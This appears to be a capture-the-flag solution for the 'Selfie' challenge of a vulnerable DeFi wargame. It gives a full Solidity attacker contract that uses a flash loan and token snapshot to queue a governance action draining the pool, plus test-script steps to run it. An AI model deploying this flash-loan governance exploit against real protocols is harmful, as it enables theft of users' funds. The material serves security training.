# Selfie

**HINT:** 
 
<details>
<summary>Part 1</summary>
<p>

```
pragma solidity ^0.6.0;

// Simple Governance, Selfie Pool and DamnValuable Token Snapshot interfaces
interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external;

    function transfer(address, uint256) external;

    function balanceOf(address account) external returns (uint256);
}

contract SelfieAttacker {
    IDamnValuableTokenSnapshot token;
    ISimpleGovernance governance;
    ISelfiePool pool;
    address attackerEOA;
    uint256 public actionId;

    constructor(IDamnValuableTokenSnapshot _token, ISimpleGovernance _governance, ISelfiePool _pool) public {
        token = _token;
        governance = _governance;
        pool = _pool;
    }

    function attack() public {
        uint256 flashLoanBalance = token.balanceOf(address(pool));
        attackerEOA = msg.sender;

        pool.flashLoan(flashLoanBalance);
    }

    // called by ISelfiePool::flashLoan
    function receiveTokens(address, uint256 amount) external {
        // received tokens => take a snapshot because it's checked in queueAction
        token.snapshot();

        // we can now queue a government action to drain all funds to attacker account
        // because it checks the balance of governance tokens (which is the same token as the pool token)
        bytes memory drainAllFundsPayload =
            abi.encodeWithSignature("drainAllFunds(address)", attackerEOA);
        // store actionId so we can later execute it
        actionId = governance.queueAction(
            address(pool),
            drainAllFundsPayload,
            0
        );

        // pay back to flash loan sender
        token.transfer(address(pool), amount);
    }
}
```

</p>
</details>

<details>
<summary>Part 2</summary>
<p>

Now go to ```selfie.challenge.js``` and at the top of the file add:
```js
const SelfieAttacker = contract.fromArtifact("SelfieAttacker");
```
And at ```Exploit``` add:
```js
this.attacker = await SelfieAttacker.new(
    this.token.address,
    this.governance.address,
    this.pool.address,
    { from: attacker }
);
await this.attacker.attack({ from: attacker });
await time.increase(time.duration.days(2));
await this.governance.executeAction(await this.attacker.actionId(), { from: attacker });
```

```sh
npm run selfie.challenge.js
```

</p>
</details>